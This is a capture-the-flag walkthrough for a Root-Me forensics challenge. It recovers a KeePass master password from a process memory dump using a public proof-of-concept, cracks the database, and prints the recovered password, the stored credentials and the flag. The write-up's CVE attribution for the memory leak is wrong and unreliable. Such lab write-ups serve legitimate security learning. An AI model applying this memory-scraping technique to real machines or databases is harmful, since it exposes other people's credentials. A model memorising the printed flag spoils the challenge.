# MasterKee

## Challenge Details

- Category: Forensics
- Points: 15
- Validation: 2253
- Author: Ayweth20
- Status: Done
# Handout
`MasterKee: Memory forgets nothing`
`A colleague has set up a useful system on his new machine. He insists he’s the only one who can access it using what he knows, but you want to show him that anyone could access it without him even being there. Your challenge is to show him that you’re capable of much more than he imagines.`
https://static.root-me.org/forensic/ch45/ch45.zip
## Walkthrough
Judging by the name we are probably dealing with a mem dump with a kdbx file which would probably have the flag, seems easy enough. Unzipping:

```bash
$ unzip ch45.zip
        Archive:  ch45.zip
  inflating: Masterkee.kdbx
  inflating: MasterKee.DMP
```

Oh they gave us the kdbx file directly? Seems unnecessary, let's start by trying to crack it directly using jtr, but i doubt that this is what the challenge intends:
```bash
$ ~/tools/john-jumbo/run/keepass2john /mnt/d/CTF/rootme/masterkee/Masterkee.kdbx > kdbx.hash && cat kdbx.hash

	Masterkee:$keepass$*4*600000*c9d9f39a*0*0*0*c1706942129c99e66ff18588b2de82e3d16a261c459b85cb089a13c34d1e8f20*dd37b3b8376d3dd6a25173caa23726874ac3f69ae86f5908be190ccd7769784a*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000c1706942129c99e66ff18588b2de82e3d16a261c459b85cb089a13c34d1e8f200b5d00000000014205000000245555494410000000c9d9f39a628a4460bf740d08c18a4fea05010000005208000000c02709000000000042010000005320000000dd37b3b8376d3dd6a25173caa23726874ac3f69ae86f5908be190ccd7769784a000710000000f92241a7527de9e2b26269ab6e82ff3d00040000000d0a0d0a*be1afd08729d7361b696720ece378242673bba8cafb10ae02f5d292179fd497f
```

I tried cracking it with rockyou but it didn't work, which is expected, we are probably looking at a keepass cve (probably ver 2.53 like the `Remote Support` challenge)

Let's check out the dump file:

```bash
$ file MasterKee.DMP
MasterKee.DMP: Mini DuMP crash report, 17 streams, Sat Feb 10 18:33:12 2024, 0x421826 type
```

It's a keepass mini dump file, let's look for strings to pinpoint the version:

```bash
$ strings MasterKee.DMP  | rg newVersion
                                        newVersion="2.53.1.20815" />
                                        newVersion="2.53.1.20815" />
```

Yup, it's a memory dump for the keepass process, version 2.53, let's look for cves for this:

https://nvd.nist.gov/vuln/detail/cve-2023-24055

I found a poc for this, CVE-2023-24055

https://github.com/matro7sh/keepass-dump-masterkey

Let's use this, according to the report this cannot get the first character, so we might have to bruteforce that:

```bash
$ git clone https://github.com/matro7sh/keepass-dump-masterkey
Cloning into 'keepass-dump-masterkey'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 0), reused 6 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 32.52 KiB | 2.50 MiB/s, done.

$ python3 keepass-dump-masterkey/poc.py MasterKee.DMP
2026-07-22 14:46:58,028 [.] [main] Opened MasterKee.DMP
Possible password: ●ere_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●3re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●'re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●Dre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●\re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●#re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●yre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●kre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●9re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●;re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●Hre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●Bre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●qre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●are_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
```

And it worked! And judging by the phrase the first character is probably `H`, Let's dump the password from the db using masterkee `Here_Is_My_V3ry_S3cr3t_P4ssw0rd2024!`

```bash
$ keepassxc-cli export -f csv Masterkee.kdbx  > passwords.csv && cat passwords.csv
Enter password to unlock Masterkee.kdbx:
"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"
"RootMe","Sample Entry","User Name","Password","https://keepass.info/","Notes","","0","2024-02-06T19:44:51Z","2024-02-06T19:44:51Z"
"RootMe","Sample Entry #2","Michael321","12345","https://keepass.info/help/kb/testform.html","","","0","2024-02-06T19:44:51Z","2024-02-06T19:44:51Z"
"RootMe/Windows","Windoxs","Ayweth20","root","","","","38","2024-02-07T10:26:57Z","2024-02-07T10:26:24Z"
"RootMe/Internet","RootMi","TheBestNoob","gSZxR7pUYaqABmQr1fEU","hxxps://rootmi.xyz/","","","1","2024-02-06T19:47:34Z","2024-02-06T19:46:16Z"
"RootMe/Internet","Amstramgram","Lamstragrameur","Amstr@gr4m2001*","https://amstramgram.com/","","","1","2024-02-07T10:29:27Z","2024-02-07T10:27:38Z"
"RootMe/Notes","Flag","RootMe","RM{Upd4T3_KeEPas5_t0_2.54}","","","","37","2024-10-25T05:23:44Z","2024-10-25T05:23:10Z"
```

`TheBestNoob`, lol.
And there's our flag!
# FLAG
RM{Upd4T3_KeEPas5_t0_2.54}
